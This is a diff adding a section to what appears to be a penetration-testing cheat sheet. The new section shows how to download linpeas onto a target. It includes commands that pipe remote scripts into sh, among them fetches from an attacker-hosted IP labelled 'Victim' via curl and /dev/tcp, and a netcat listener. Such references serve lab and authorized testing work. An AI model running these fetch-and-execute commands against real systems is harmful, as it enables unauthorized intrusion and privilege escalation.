@@ -73,6 +73,29 @@ find / -perm -u=s -type f 2>/dev/null
 netstat -tuln
 ```
 
+Linepeas Installation on Target with and without internet
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+```bash
+# From github
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+# Without curl
+python -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"
+
+python3 -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"
+```
+
+```bash
+# Local network
+sudo python3 -m http.server 80 #Host
+curl 10.10.10.10/linpeas.sh | sh #Victim
+
+# Without curl
+sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
+cat < /dev/tcp/10.10.10.10/80 | sh #Victim
+```
+
 ligolo-ng port forwarding tool commands:
 -----------------------------------------------------------------------
 ```
